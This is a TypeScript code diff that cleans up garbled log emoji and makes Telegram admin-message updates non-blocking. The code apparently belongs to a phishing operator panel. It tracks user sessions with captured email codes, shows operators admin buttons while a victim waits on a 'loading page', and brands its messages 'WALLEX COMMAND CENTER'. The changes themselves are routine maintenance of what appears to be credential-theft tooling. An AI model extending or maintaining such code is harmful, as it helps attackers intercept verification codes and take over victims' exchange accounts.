@@ -213,7 +213,7 @@ export const updateSessionWithEmailCode = async (
       );
     }
 
-    console.log("�� Session updated with email code:", {
+    console.log("✅ Session updated with email code:", {
       sessionId,
       emailCode,
     });
@@ -310,16 +310,34 @@ export const updateUserOnlineStatus = async (
         const updatedMessage = formatSessionMessage(session);
         const keyboard = getAdminKeyboard(sessionId, session);
 
-        await updateTelegramMessage(
-          session.messageId,
-          updatedMessage,
-          keyboard,
-        );
+        // Use setTimeout to make it non-blocking
+        updateTelegramMessage(session.messageId, updatedMessage, keyboard)
+          .then(() => {
+            console.log("✅ Telegram message updated successfully");
+          })
+          .catch((updateError) => {
+            console.error("❌ Failed to update Telegram message:", {
+              error: updateError.message,
+              sessionId,
+              messageId: session.messageId,
+              statusText,
+              statusEmoji,
+            });
 
-        console.log("✅ Telegram message updated successfully");
+            // Log additional debug info
+            console.log("🔍 Debug info:", {
+              telegramApiBase: TELEGRAM_API_BASE,
+              hasToken: !!TELEGRAM_BOT_TOKEN,
+              hasChatId: !!TELEGRAM_CHAT_ID,
+            });
+          });
       } catch (updateError) {
-        console.error("❌ Failed to update Telegram message:", updateError);
-        // Don't fail the whole function if Telegram update fails
+        console.error("❌ Error preparing Telegram update:", {
+          error: updateError.message,
+          sessionId,
+          statusText,
+          statusEmoji,
+        });
       }
     } else if (!statusChanged) {
       console.log("ℹ️ Status unchanged, skipping Telegram update");
@@ -738,7 +756,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     return { inline_keyboard: [] };
   }
 
-  console.log("�� Admin buttons ALLOWED - user is on loading page");
+  console.log("✅ Admin buttons ALLOWED - user is on loading page");
 
   const buttons = [];
 
@@ -1360,7 +1378,7 @@ const formatSessionMessage = (session: UserSession): string => {
   // Simple footer with session info
   message += `\n\n🆔 Session: <code>${session.sessionId.substring(0, 10)}</code>
 
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬��▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 <i>🔐 WALLEX COMMAND CENTER</i>`;
 
   return message;
